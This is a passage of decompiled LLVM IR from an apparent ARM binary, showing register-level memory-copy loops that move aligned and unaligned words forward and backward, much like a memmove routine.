  %v6_15a70 = icmp slt i32 %v1_15a70, 0
  store i1 %v6_15a70, i1* %cpsr_n.global-to-local, align 1
  %v7_15a70 = icmp eq i32 %v1_15a70, 0
  store i1 %v7_15a70, i1* %cpsr_z.global-to-local, align 1
  %v2_15a74 = xor i1 %v6_15a70, %v5_15a70
  br i1 %v2_15a74, label %dec_label_pc_15a90, label %dec_label_pc_15a78

dec_label_pc_15a78:                               ; preds = %dec_label_pc_15a6c, %dec_label_pc_15a2c, %dec_label_pc_15a78
  %v1_15a84 = phi i32 [ %v4_15a84, %dec_label_pc_15a78 ], [ %v12_15a60, %dec_label_pc_15a6c ], [ %v0_15acc76, %dec_label_pc_15a2c ]
  %v0_15a78 = load i32, i32* %lr.global-to-local, align 4
  %v3_15a78 = udiv i32 %v0_15a78, 65536
  store i32 %v3_15a78, i32* %ip.global-to-local, align 4
  %v0_15a7c = load i32, i32* %r1.global-to-local, align 4
  %v1_15a7c = inttoptr i32 %v0_15a7c to i32*
  %v2_15a7c = load i32, i32* %v1_15a7c, align 4
  store i32 %v2_15a7c, i32* %lr.global-to-local, align 4
  %v4_15a7c = add i32 %v0_15a7c, 4
  store i32 %v4_15a7c, i32* %r1.global-to-local, align 4
  %v4_15a80 = mul i32 %v2_15a7c, 65536
  %v5_15a80 = or i32 %v4_15a80, %v3_15a78
  store i32 %v5_15a80, i32* @ip, align 4
  %v2_15a84 = inttoptr i32 %v1_15a84 to i32*
  store i32 %v5_15a80, i32* %v2_15a84, align 4
  %v3_15a84 = load i32, i32* @r0, align 4
  %v4_15a84 = add i32 %v3_15a84, 4
  store i32 %v4_15a84, i32* @r0, align 4
  %v0_15a88 = load i32, i32* %r2.global-to-local, align 4
  %v1_15a88 = add i32 %v0_15a88, -4
  store i32 %v1_15a88, i32* %r2.global-to-local, align 4
  %v3_15a88 = sub i32 3, %v0_15a88
  %v4_15a88 = and i32 %v3_15a88, %v0_15a88
  %v5_15a88 = icmp slt i32 %v4_15a88, 0
  %v6_15a88 = icmp slt i32 %v1_15a88, 0
  %v2_15a8c = xor i1 %v6_15a88, %v5_15a88
  br i1 %v2_15a8c, label %dec_label_pc_15a90.loopexit, label %dec_label_pc_15a78

dec_label_pc_15a90.loopexit:                      ; preds = %dec_label_pc_15a78
  %v7_15a88 = icmp eq i32 %v0_15a88, 4
  store i1 %v5_15a88, i1* %cpsr_v.global-to-local, align 1
  store i1 %v6_15a88, i1* %cpsr_n.global-to-local, align 1
  store i1 %v7_15a88, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_15a90

dec_label_pc_15a90:                               ; preds = %dec_label_pc_15a90.loopexit, %dec_label_pc_15a6c
  %v0_1594c60 = phi i32 [ %v1_15a88, %dec_label_pc_15a90.loopexit ], [ %v1_15a70, %dec_label_pc_15a6c ]
  %v0_15a90 = load i32, i32* %r1.global-to-local, align 4
  %v1_15a90 = add i32 %v0_15a90, -2
  store i32 %v1_15a90, i32* @r1, align 4
  br label %bb140

dec_label_pc_15a98:                               ; preds = %dec_label_pc_159ac
  br i1 %v2_15a30, label %dec_label_pc_15ae4, label %dec_label_pc_15aa0

dec_label_pc_15aa0:                               ; preds = %dec_label_pc_15a98
  store i32 %v1_15a2c, i32* %r2.global-to-local, align 4
  %v3_15aa4 = load i32, i32* @r4, align 4
  store i32 %v3_15aa4, i32* %stack_var_-16, align 4
  %v6_15aa4 = load i32, i32* @r5, align 4
  store i32 %v6_15aa4, i32* %stack_var_-12, align 4
  br label %dec_label_pc_15aa8

dec_label_pc_15aa8:                               ; preds = %dec_label_pc_15aa8.dec_label_pc_15aa8_crit_edge, %dec_label_pc_15aa0
  %v0_15acc = phi i32 [ %v12_15acc, %dec_label_pc_15aa8.dec_label_pc_15aa8_crit_edge ], [ %v0_15acc76, %dec_label_pc_15aa0 ]
  %v0_15aac = phi i32 [ %v0_15aac.pre, %dec_label_pc_15aa8.dec_label_pc_15aa8_crit_edge ], [ %v4_159b0, %dec_label_pc_15aa0 ]
  %v0_15aa8 = phi i32 [ %v0_15aa8.pre, %dec_label_pc_15aa8.dec_label_pc_15aa8_crit_edge ], [ %v2_159b0, %dec_label_pc_15aa0 ]
  %v3_15aa8 = udiv i32 %v0_15aa8, 16777216
  %v1_15aac = inttoptr i32 %v0_15aac to i32*
  %v2_15aac = load i32, i32* %v1_15aac, align 4
  store i32 %v2_15aac, i32* %r4.global-to-local, align 4
  %v3_15aac = add i32 %v0_15aac, 4
  %v4_15aac = inttoptr i32 %v3_15aac to i32*
  %v5_15aac = load i32, i32* %v4_15aac, align 4
  store i32 %v5_15aac, i32* %r5.global-to-local, align 4
  %v6_15aac = add i32 %v0_15aac, 8
  %v7_15aac = inttoptr i32 %v6_15aac to i32*
  %v8_15aac = load i32, i32* %v7_15aac, align 4
  store i32 %v8_15aac, i32* %ip.global-to-local, align 4
  %v9_15aac = add i32 %v0_15aac, 12
  %v10_15aac = inttoptr i32 %v9_15aac to i32*
  %v11_15aac = load i32, i32* %v10_15aac, align 4
  store i32 %v11_15aac, i32* %lr.global-to-local, align 4
  %v12_15aac = add i32 %v0_15aac, 16
  store i32 %v12_15aac, i32* %r1.global-to-local, align 4
  %v4_15ab0 = mul i32 %v2_15aac, 256
  %v5_15ab0 = or i32 %v4_15ab0, %v3_15aa8
  store i32 %v5_15ab0, i32* @r3, align 4
  %v3_15ab4 = udiv i32 %v2_15aac, 16777216
  %v4_15ab8 = mul i32 %v5_15aac, 256
  %v5_15ab8 = or i32 %v4_15ab8, %v3_15ab4
  store i32 %v5_15ab8, i32* %r4.global-to-local, align 4
  %v3_15abc = udiv i32 %v5_15aac, 16777216
  %v4_15ac0 = mul i32 %v8_15aac, 256
  %v5_15ac0 = or i32 %v4_15ac0, %v3_15abc
  store i32 %v5_15ac0, i32* %r5.global-to-local, align 4
  %v3_15ac4 = udiv i32 %v8_15aac, 16777216
  %v4_15ac8 = mul i32 %v11_15aac, 256
  %v5_15ac8 = or i32 %v4_15ac8, %v3_15ac4
  store i32 %v5_15ac8, i32* @ip, align 4
  %v1_15acc = inttoptr i32 %v0_15acc to i32*
  store i32 %v5_15ab0, i32* %v1_15acc, align 4
  %v3_15acc = add i32 %v0_15acc, 4
  %v4_15acc = inttoptr i32 %v3_15acc to i32*
  %v5_15acc = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_15acc, i32* %v4_15acc, align 4
  %v6_15acc = add i32 %v0_15acc, 8
  %v7_15acc = inttoptr i32 %v6_15acc to i32*
  %v8_15acc = load i32, i32* %r5.global-to-local, align 4
  store i32 %v8_15acc, i32* %v7_15acc, align 4
  %v9_15acc = add i32 %v0_15acc, 12
  %v10_15acc = inttoptr i32 %v9_15acc to i32*
  %v11_15acc = load i32, i32* @ip, align 4
  store i32 %v11_15acc, i32* %v10_15acc, align 4
  %v12_15acc = add i32 %v0_15acc, 16
  store i32 %v12_15acc, i32* @r0, align 4
  %v0_15ad0 = load i32, i32* %r2.global-to-local, align 4
  %v1_15ad0 = add i32 %v0_15ad0, -16
  store i32 %v1_15ad0, i32* %r2.global-to-local, align 4
  %v3_15ad0 = sub i32 15, %v0_15ad0
  %v4_15ad0 = and i32 %v3_15ad0, %v0_15ad0
  %v5_15ad0 = icmp slt i32 %v4_15ad0, 0
  %v6_15ad0 = icmp slt i32 %v1_15ad0, 0
  %v2_15ad4 = xor i1 %v6_15ad0, %v5_15ad0
  br i1 %v2_15ad4, label %dec_label_pc_15ad8, label %dec_label_pc_15aa8.dec_label_pc_15aa8_crit_edge

dec_label_pc_15aa8.dec_label_pc_15aa8_crit_edge:  ; preds = %dec_label_pc_15aa8
  %v0_15aa8.pre = load i32, i32* %lr.global-to-local, align 4
  %v0_15aac.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_15aa8

dec_label_pc_15ad8:                               ; preds = %dec_label_pc_15aa8
  %v2_15ad8 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_15ad8, i32* @r4, align 4
  %v5_15ad8 = load i32, i32* %stack_var_-12, align 4
  store i32 %v5_15ad8, i32* @r5, align 4
  %v1_15adc = add i32 %v0_15ad0, -4
  store i32 %v1_15adc, i32* %r2.global-to-local, align 4
  %v3_15adc = add i32 %v0_15ad0, 2147483632
  %v4_15adc = and i32 %v1_15adc, %v3_15adc
  %v5_15adc = icmp slt i32 %v4_15adc, 0
  store i1 %v5_15adc, i1* %cpsr_v.global-to-local, align 1
  %v6_15adc = icmp slt i32 %v1_15adc, 0
  store i1 %v6_15adc, i1* %cpsr_n.global-to-local, align 1
  %v7_15adc = icmp eq i32 %v1_15adc, 0
  store i1 %v7_15adc, i1* %cpsr_z.global-to-local, align 1
  %v2_15ae0 = xor i1 %v6_15adc, %v5_15adc
  br i1 %v2_15ae0, label %dec_label_pc_15afc, label %dec_label_pc_15ae4

dec_label_pc_15ae4:                               ; preds = %dec_label_pc_15ad8, %dec_label_pc_15a98, %dec_label_pc_15ae4
  %v1_15af0 = phi i32 [ %v4_15af0, %dec_label_pc_15ae4 ], [ %v12_15acc, %dec_label_pc_15ad8 ], [ %v0_15acc76, %dec_label_pc_15a98 ]
  %v0_15ae4 = load i32, i32* %lr.global-to-local, align 4
  %v3_15ae4 = udiv i32 %v0_15ae4, 16777216
  store i32 %v3_15ae4, i32* %ip.global-to-local, align 4
  %v0_15ae8 = load i32, i32* %r1.global-to-local, align 4
  %v1_15ae8 = inttoptr i32 %v0_15ae8 to i32*
  %v2_15ae8 = load i32, i32* %v1_15ae8, align 4
  store i32 %v2_15ae8, i32* %lr.global-to-local, align 4
  %v4_15ae8 = add i32 %v0_15ae8, 4
  store i32 %v4_15ae8, i32* %r1.global-to-local, align 4
  %v4_15aec = mul i32 %v2_15ae8, 256
  %v5_15aec = or i32 %v4_15aec, %v3_15ae4
  store i32 %v5_15aec, i32* @ip, align 4
  %v2_15af0 = inttoptr i32 %v1_15af0 to i32*
  store i32 %v5_15aec, i32* %v2_15af0, align 4
  %v3_15af0 = load i32, i32* @r0, align 4
  %v4_15af0 = add i32 %v3_15af0, 4
  store i32 %v4_15af0, i32* @r0, align 4
  %v0_15af4 = load i32, i32* %r2.global-to-local, align 4
  %v1_15af4 = add i32 %v0_15af4, -4
  store i32 %v1_15af4, i32* %r2.global-to-local, align 4
  %v3_15af4 = sub i32 3, %v0_15af4
  %v4_15af4 = and i32 %v3_15af4, %v0_15af4
  %v5_15af4 = icmp slt i32 %v4_15af4, 0
  %v6_15af4 = icmp slt i32 %v1_15af4, 0
  %v2_15af8 = xor i1 %v6_15af4, %v5_15af4
  br i1 %v2_15af8, label %dec_label_pc_15afc.loopexit, label %dec_label_pc_15ae4

dec_label_pc_15afc.loopexit:                      ; preds = %dec_label_pc_15ae4
  %v7_15af4 = icmp eq i32 %v0_15af4, 4
  store i1 %v5_15af4, i1* %cpsr_v.global-to-local, align 1
  store i1 %v6_15af4, i1* %cpsr_n.global-to-local, align 1
  store i1 %v7_15af4, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_15afc

dec_label_pc_15afc:                               ; preds = %dec_label_pc_15afc.loopexit, %dec_label_pc_15ad8
  %v0_1594c61 = phi i32 [ %v1_15af4, %dec_label_pc_15afc.loopexit ], [ %v1_15adc, %dec_label_pc_15ad8 ]
  %v0_15afc = load i32, i32* %r1.global-to-local, align 4
  %v1_15afc = add i32 %v0_15afc, -1
  store i32 %v1_15afc, i32* @r1, align 4
  br label %bb140

dec_label_pc_15b04:                               ; preds = %dec_label_pc_158b0
  %v1_15b04 = load i32, i32* @r2, align 4
  %v2_15b04 = add i32 %v1_15b04, %v0_158b0
  store i32 %v2_15b04, i32* %r1.global-to-local, align 4
  %v2_15b08 = add i32 %v1_15b04, %v1_158b0
  store i32 %v2_15b08, i32* %r0.global-to-local, align 4
  %v2_15b0c = add i32 %v1_15b04, -4
  store i32 %v2_15b0c, i32* %r2.global-to-local, align 4
  %v4_15b0c = sub i32 3, %v1_15b04
  %v5_15b0c = and i32 %v4_15b0c, %v1_15b04
  %v6_15b0c = icmp slt i32 %v5_15b0c, 0
  store i1 %v6_15b0c, i1* %cpsr_v.global-to-local, align 1
  %v7_15b0c = icmp slt i32 %v2_15b0c, 0
  store i1 %v7_15b0c, i1* %cpsr_n.global-to-local, align 1
  %v8_15b0c = icmp eq i32 %v1_15b04, 4
  store i1 %v8_15b0c, i1* %cpsr_z.global-to-local, align 1
  %v5_15b10 = icmp slt i32 %v1_15b04, 4
  br i1 %v5_15b10, label %bb150, label %dec_label_pc_15b14

dec_label_pc_15b14:                               ; preds = %dec_label_pc_15b04
  %v1_15b14 = urem i32 %v2_15b08, 4
  store i32 %v1_15b14, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_15b14 = icmp eq i32 %v1_15b14, 0
  store i1 %v2_15b14, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15b14, label %dec_label_pc_15b1c, label %dec_label_pc_15bbc

dec_label_pc_15b1c:                               ; preds = %dec_label_pc_15b14
  %v1_15b1c = urem i32 %v2_15b04, 4
  store i32 %v1_15b1c, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_15b1c = icmp eq i32 %v1_15b1c, 0
  store i1 %v2_15b1c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15b1c, label %dec_label_pc_15b24, label %dec_label_pc_15be8

dec_label_pc_15b24:                               ; preds = %dec_label_pc_15b1c, %dec_label_pc_15be0
  %v0_15b3c37 = phi i32 [ %v2_15b08, %dec_label_pc_15b1c ], [ %v0_15c3020, %dec_label_pc_15be0 ]
  %v0_15b3836 = phi i32 [ %v2_15b04, %dec_label_pc_15b1c ], [ %v0_15be0, %dec_label_pc_15be0 ]
  %v0_15b24 = phi i32 [ %v2_15b0c, %dec_label_pc_15b1c ], [ %v2_15bd8, %dec_label_pc_15be0 ]
  %v2_15b24 = add i32 %v0_15b24, -8
  store i32 %v2_15b24, i32* %r2.global-to-local, align 4
  %v4_15b24 = sub i32 7, %v0_15b24
  %v5_15b24 = and i32 %v4_15b24, %v0_15b24
  %v6_15b24 = icmp slt i32 %v5_15b24, 0
  store i1 %v6_15b24, i1* %cpsr_v.global-to-local, align 1
  %v7_15b24 = icmp slt i32 %v2_15b24, 0
  store i1 %v7_15b24, i1* %cpsr_n.global-to-local, align 1
  %v8_15b24 = icmp eq i32 %v0_15b24, 8
  store i1 %v8_15b24, i1* %cpsr_z.global-to-local, align 1
  %v5_15b28 = icmp slt i32 %v0_15b24, 8
  br i1 %v5_15b28, label %dec_label_pc_15b74, label %dec_label_pc_15b2c

dec_label_pc_15b2c:                               ; preds = %dec_label_pc_15b24
  %v3_15b2c = load i32, i32* @r4, align 4
  %v5_15b2c = inttoptr i32 %v3_15b2c to i8*
  store i8* %v5_15b2c, i8** %stack_var_-8, align 4
  %v8_15b2c = load i32, i32* @lr, align 4
  %v2_15b30 = add i32 %v0_15b24, -28
  store i32 %v2_15b30, i32* %r2.global-to-local, align 4
  %v4_15b30 = sub i32 27, %v0_15b24
  %v5_15b30 = and i32 %v4_15b30, %v2_15b24
  %v6_15b30 = icmp slt i32 %v5_15b30, 0
  store i1 %v6_15b30, i1* %cpsr_v.global-to-local, align 1
  %v7_15b30 = icmp slt i32 %v2_15b30, 0
  store i1 %v7_15b30, i1* %cpsr_n.global-to-local, align 1
  %v8_15b30 = icmp eq i32 %v2_15b24, 20
  store i1 %v8_15b30, i1* %cpsr_z.global-to-local, align 1
  %v5_15b34 = icmp slt i32 %v2_15b24, 20
  br i1 %v5_15b34, label %dec_label_pc_15b50, label %dec_label_pc_15b38

dec_label_pc_15b38:                               ; preds = %dec_label_pc_15b2c, %dec_label_pc_15b38.dec_label_pc_15b38_crit_edge
  %v0_15b3c = phi i32 [ %v1_15b44, %dec_label_pc_15b38.dec_label_pc_15b38_crit_edge ], [ %v0_15b3c37, %dec_label_pc_15b2c ]
  %v0_15b38 = phi i32 [ %v0_15b38.pre, %dec_label_pc_15b38.dec_label_pc_15b38_crit_edge ], [ %v0_15b3836, %dec_label_pc_15b2c ]
  %v1_15b38 = add i32 %v0_15b38, -4
  %v2_15b38 = inttoptr i32 %v1_15b38 to i32*
  %v3_15b38 = load i32, i32* %v2_15b38, align 4
  %v4_15b38 = add i32 %v0_15b38, -8
  %v5_15b38 = inttoptr i32 %v4_15b38 to i32*
  %v6_15b38 = load i32, i32* %v5_15b38, align 4
  store i32 %v6_15b38, i32* %r4.global-to-local, align 4
  %v7_15b38 = add i32 %v0_15b38, -12
  %v8_15b38 = inttoptr i32 %v7_15b38 to i32*
  %v9_15b38 = load i32, i32* %v8_15b38, align 4
  store i32 %v9_15b38, i32* %ip.global-to-local, align 4
  %v10_15b38 = add i32 %v0_15b38, -16
  %v11_15b38 = inttoptr i32 %v10_15b38 to i32*
  %v12_15b38 = load i32, i32* %v11_15b38, align 4
  store i32 %v12_15b38, i32* %lr.global-to-local, align 4
  store i32 %v10_15b38, i32* %r1.global-to-local, align 4
  %v1_15b3c = add i32 %v0_15b3c, -16
  %v2_15b3c = inttoptr i32 %v1_15b3c to i32*
  store i32 %v3_15b38, i32* %v2_15b3c, align 4
  %v4_15b3c = add i32 %v0_15b3c, -12
  %v5_15b3c = inttoptr i32 %v4_15b3c to i32*
  %v6_15b3c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v6_15b3c, i32* %v5_15b3c, align 4
  %v7_15b3c = add i32 %v0_15b3c, -8
  %v8_15b3c = inttoptr i32 %v7_15b3c to i32*
  %v9_15b3c = load i32, i32* %ip.global-to-local, align 4
  store i32 %v9_15b3c, i32* %v8_15b3c, align 4
  %v10_15b3c = add i32 %v0_15b3c, -4
  %v11_15b3c = inttoptr i32 %v10_15b3c to i32*
  %v12_15b3c = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_15b3c, i32* %v11_15b3c, align 4
  store i32 %v1_15b3c, i32* %r0.global-to-local, align 4
  %v0_15b40 = load i32, i32* %r1.global-to-local, align 4
  %v1_15b40 = add i32 %v0_15b40, -4
  %v2_15b40 = inttoptr i32 %v1_15b40 to i32*
  %v3_15b40 = load i32, i32* %v2_15b40, align 4
  store i32 %v3_15b40, i32* @r3, align 4
  %v4_15b40 = add i32 %v0_15b40, -8
  %v5_15b40 = inttoptr i32 %v4_15b40 to i32*
  %v6_15b40 = load i32, i32* %v5_15b40, align 4
  store i32 %v6_15b40, i32* %r4.global-to-local, align 4
  %v7_15b40 = add i32 %v0_15b40, -12
  %v8_15b40 = inttoptr i32 %v7_15b40 to i32*
  %v9_15b40 = load i32, i32* %v8_15b40, align 4
  store i32 %v9_15b40, i32* @ip, align 4
  %v10_15b40 = add i32 %v0_15b40, -16
  %v11_15b40 = inttoptr i32 %v10_15b40 to i32*
  %v12_15b40 = load i32, i32* %v11_15b40, align 4
  store i32 %v12_15b40, i32* %lr.global-to-local, align 4
  store i32 %v10_15b40, i32* %r1.global-to-local, align 4
  %v1_15b44 = add i32 %v0_15b3c, -32
  %v2_15b44 = inttoptr i32 %v1_15b44 to i32*
  store i32 %v3_15b40, i32* %v2_15b44, align 4
  %v4_15b44 = add i32 %v0_15b3c, -28
  %v5_15b44 = inttoptr i32 %v4_15b44 to i32*
  %v6_15b44 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v6_15b44, i32* %v5_15b44, align 4
  %v7_15b44 = add i32 %v0_15b3c, -24
  %v8_15b44 = inttoptr i32 %v7_15b44 to i32*
  %v9_15b44 = load i32, i32* @ip, align 4
  store i32 %v9_15b44, i32* %v8_15b44, align 4
  %v10_15b44 = add i32 %v0_15b3c, -20
  %v11_15b44 = inttoptr i32 %v10_15b44 to i32*
  %v12_15b44 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_15b44, i32* %v11_15b44, align 4
  store i32 %v1_15b44, i32* %r0.global-to-local, align 4
  %v0_15b48 = load i32, i32* %r2.global-to-local, align 4
  %v2_15b48 = add i32 %v0_15b48, -32
  store i32 %v2_15b48, i32* %r2.global-to-local, align 4
  %v6_15b4c = icmp slt i32 %v0_15b48, 32
  br i1 %v6_15b4c, label %dec_label_pc_15b50.loopexit, label %dec_label_pc_15b38.dec_label_pc_15b38_crit_edge

dec_label_pc_15b38.dec_label_pc_15b38_crit_edge:  ; preds = %dec_label_pc_15b38
  %v0_15b38.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_15b38

dec_label_pc_15b50.loopexit:                      ; preds = %dec_label_pc_15b38
  %v4_15b48 = sub i32 31, %v0_15b48
  %v5_15b48 = and i32 %v4_15b48, %v0_15b48
  %v6_15b48 = icmp slt i32 %v5_15b48, 0
  %v7_15b48 = icmp slt i32 %v2_15b48, 0
  store i1 %v6_15b48, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_15b48, i1* %cpsr_n.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_15b50

dec_label_pc_15b50:                               ; preds = %dec_label_pc_15b50.loopexit, %dec_label_pc_15b2c
  %v6_15b58 = phi i32 [ %v1_15b44, %dec_label_pc_15b50.loopexit ], [ %v0_15b3c37, %dec_label_pc_15b2c ]
  %v0_15b60.pr = phi i32 [ %v2_15b48, %dec_label_pc_15b50.loopexit ], [ %v2_15b30, %dec_label_pc_15b2c ]
  %v4_15b50 = add i32 %v0_15b60.pr, 16
  %v6_15b50 = sub i32 0, %v0_15b60.pr
  %v7_15b50 = and i32 %v4_15b50, %v6_15b50
  %v8_15b50 = icmp slt i32 %v7_15b50, 0
  store i1 %v8_15b50, i1* %cpsr_v.global-to-local, align 1
  %v9_15b50 = icmp slt i32 %v4_15b50, 0
  store i1 %v9_15b50, i1* %cpsr_n.global-to-local, align 1
  %v10_15b50 = icmp eq i32 %v4_15b50, 0
  store i1 %v10_15b50, i1* %cpsr_z.global-to-local, align 1
  %v5_15b54 = icmp slt i32 %v0_15b60.pr, -16
  br i1 %v5_15b54, label %.thread2, label %bb147

bb147:                                            ; preds = %dec_label_pc_15b50
  %v6_15b54 = load i32, i32* %r1.global-to-local, align 4
  %v7_15b54 = add i32 %v6_15b54, -4
  %v8_15b54 = inttoptr i32 %v7_15b54 to i32*
  %v9_15b54 = load i32, i32* %v8_15b54, align 4
  store i32 %v9_15b54, i32* @r3, align 4
  %v10_15b54 = add i32 %v6_15b54, -8
  %v11_15b54 = inttoptr i32 %v10_15b54 to i32*
  %v12_15b54 = load i32, i32* %v11_15b54, align 4
  store i32 %v12_15b54, i32* %r4.global-to-local, align 4
  %v13_15b54 = add i32 %v6_15b54, -12
  %v14_15b54 = inttoptr i32 %v13_15b54 to i32*
  %v15_15b54 = load i32, i32* %v14_15b54, align 4
  store i32 %v15_15b54, i32* @ip, align 4
  %v16_15b54 = add i32 %v6_15b54, -16
  %v17_15b54 = inttoptr i32 %v16_15b54 to i32*
  %v18_15b54 = load i32, i32* %v17_15b54, align 4
  store i32 %v18_15b54, i32* %lr.global-to-local, align 4
  store i32 %v16_15b54, i32* %r1.global-to-local, align 4
  %v7_15b58 = add i32 %v6_15b58, -16
  %v8_15b58 = inttoptr i32 %v7_15b58 to i32*
  store i32 %v9_15b54, i32* %v8_15b58, align 4
  %v10_15b58 = add i32 %v6_15b58, -12
  %v11_15b58 = inttoptr i32 %v10_15b58 to i32*
  %v12_15b58 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v12_15b58, i32* %v11_15b58, align 4
  %v13_15b58 = add i32 %v6_15b58, -8
  %v14_15b58 = inttoptr i32 %v13_15b58 to i32*
  %v15_15b58 = load i32, i32* @ip, align 4
  store i32 %v15_15b58, i32* %v14_15b58, align 4
  %v16_15b58 = add i32 %v6_15b58, -4
  %v17_15b58 = inttoptr i32 %v16_15b58 to i32*
  %v18_15b58 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v18_15b58, i32* %v17_15b58, align 4
  store i32 %v7_15b58, i32* %r0.global-to-local, align 4
  %v6_15b5c = load i32, i32* %r2.global-to-local, align 4
  %v7_15b5c = add i32 %v6_15b5c, -16
  store i32 %v7_15b5c, i32* %r2.global-to-local, align 4
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_15b50, %bb147
  %v6_15b68 = phi i32 [ %v7_15b58, %bb147 ], [ %v6_15b58, %dec_label_pc_15b50 ]
  %v0_15b60 = phi i32 [ %v7_15b5c, %bb147 ], [ %v0_15b60.pr, %dec_label_pc_15b50 ]
  %v4_15b60 = add i32 %v0_15b60, 20
  store i32 %v4_15b60, i32* %r2.global-to-local, align 4
  %v6_15b60 = sub i32 0, %v0_15b60
  %v7_15b60 = and i32 %v4_15b60, %v6_15b60
  %v8_15b60 = icmp slt i32 %v7_15b60, 0
  store i1 %v8_15b60, i1* %cpsr_v.global-to-local, align 1
  %v9_15b60 = icmp slt i32 %v4_15b60, 0
  store i1 %v9_15b60, i1* %cpsr_n.global-to-local, align 1
  %v10_15b60 = icmp eq i32 %v4_15b60, 0
  store i1 %v10_15b60, i1* %cpsr_z.global-to-local, align 1
  %v5_15b64 = icmp slt i32 %v0_15b60, -20
  br i1 %v5_15b64, label %.thread4, label %bb148

bb148:                                            ; preds = %.thread2
  %v6_15b64 = load i32, i32* %r1.global-to-local, align 4
  %v7_15b64 = add i32 %v6_15b64, -4
  %v8_15b64 = inttoptr i32 %v7_15b64 to i32*
  %v9_15b64 = load i32, i32* %v8_15b64, align 4
  store i32 %v9_15b64, i32* @r3, align 4
  %v10_15b64 = add i32 %v6_15b64, -8
  %v11_15b64 = inttoptr i32 %v10_15b64 to i32*
  %v12_15b64 = load i32, i32* %v11_15b64, align 4
  store i32 %v12_15b64, i32* @ip, align 4
  %v13_15b64 = add i32 %v6_15b64, -12
  %v14_15b64 = inttoptr i32 %v13_15b64 to i32*
  %v15_15b64 = load i32, i32* %v14_15b64, align 4
  store i32 %v15_15b64, i32* %lr.global-to-local, align 4
  store i32 %v13_15b64, i32* %r1.global-to-local, align 4
  %v7_15b68 = add i32 %v6_15b68, -12
  %v8_15b68 = inttoptr i32 %v7_15b68 to i32*
  store i32 %v9_15b64, i32* %v8_15b68, align 4
  %v10_15b68 = add i32 %v6_15b68, -8
  %v11_15b68 = inttoptr i32 %v10_15b68 to i32*
  %v12_15b68 = load i32, i32* @ip, align 4
  store i32 %v12_15b68, i32* %v11_15b68, align 4
  %v13_15b68 = add i32 %v6_15b68, -4
  %v14_15b68 = inttoptr i32 %v13_15b68 to i32*
  %v15_15b68 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v15_15b68, i32* %v14_15b68, align 4
  store i32 %v7_15b68, i32* %r0.global-to-local, align 4
  %v6_15b6c = load i32, i32* %r2.global-to-local, align 4
  %v7_15b6c = add i32 %v6_15b6c, -12
  store i32 %v7_15b6c, i32* %r2.global-to-local, align 4
  br label %.thread4

.thread4:                                         ; preds = %.thread2, %bb148
  %v6_15b8c45 = phi i32 [ %v6_15b68, %.thread2 ], [ %v7_15b68, %bb148 ]
  %v0_15b7443 = phi i32 [ %v4_15b60, %.thread2 ], [ %v7_15b6c, %bb148 ]
  %v2_15b70 = load i8*, i8** %stack_var_-8, align 4
  %v3_15b70 = ptrtoint i8* %v2_15b70 to i32
  store i32 %v3_15b70, i32* @r4, align 4
  store i32 %v8_15b2c, i32* @lr, align 4
  br label %dec_label_pc_15b74

dec_label_pc_15b74:                               ; preds = %dec_label_pc_15b24, %.thread4
  %v7_15b84 = phi i32 [ %v0_15b3c37, %dec_label_pc_15b24 ], [ %v6_15b8c45, %.thread4 ]
  %v0_15b74 = phi i32 [ %v2_15b24, %dec_label_pc_15b24 ], [ %v0_15b7443, %.thread4 ]
  %v2_15b74 = add i32 %v0_15b74, 8
  store i32 %v2_15b74, i32* %r2.global-to-local, align 4
  %v4_15b74 = sub i32 0, %v0_15b74
  %v5_15b74 = and i32 %v2_15b74, %v4_15b74
  %v6_15b74 = icmp slt i32 %v5_15b74, 0
  store i1 %v6_15b74, i1* %cpsr_v.global-to-local, align 1
  %v7_15b74 = icmp slt i32 %v2_15b74, 0
  store i1 %v7_15b74, i1* %cpsr_n.global-to-local, align 1
  %v8_15b74 = icmp eq i32 %v2_15b74, 0
  store i1 %v8_15b74, i1* %cpsr_z.global-to-local, align 1
  %v5_15b78 = icmp slt i32 %v0_15b74, -8
  br i1 %v5_15b78, label %bb150, label %dec_label_pc_15b7c

dec_label_pc_15b7c:                               ; preds = %dec_label_pc_15b74
  %v6_15b7c = add i32 %v0_15b74, 4
  store i32 %v6_15b7c, i32* %r2.global-to-local, align 4
  %v8_15b7c = sub i32 -5, %v0_15b74
  %v9_15b7c = and i32 %v8_15b7c, %v2_15b74
  %v10_15b7c = icmp slt i32 %v9_15b7c, 0
  store i1 %v10_15b7c, i1* %cpsr_v.global-to-local, align 1
  %v11_15b7c = icmp slt i32 %v6_15b7c, 0
  store i1 %v11_15b7c, i1* %cpsr_n.global-to-local, align 1
  %v12_15b7c = icmp eq i32 %v2_15b74, 4
  store i1 %v12_15b7c, i1* %cpsr_z.global-to-local, align 1
  %v5_15b80 = icmp slt i32 %v2_15b74, 4
  %v6_15b80 = load i32, i32* %r1.global-to-local, align 4
  %v7_15b80 = add i32 %v6_15b80, -4
  %v8_15b80 = inttoptr i32 %v7_15b80 to i32*
  %v9_15b80 = load i32, i32* %v8_15b80, align 4
  store i32 %v9_15b80, i32* @r3, align 4
  br i1 %v5_15b80, label %.thread8, label %bb149

.thread8:                                         ; preds = %dec_label_pc_15b7c
  store i32 %v7_15b80, i32* %r1.global-to-local, align 4
  %v8_15b84 = add i32 %v7_15b84, -4
  %v9_15b84 = inttoptr i32 %v8_15b84 to i32*
  store i32 %v9_15b80, i32* %v9_15b84, align 4
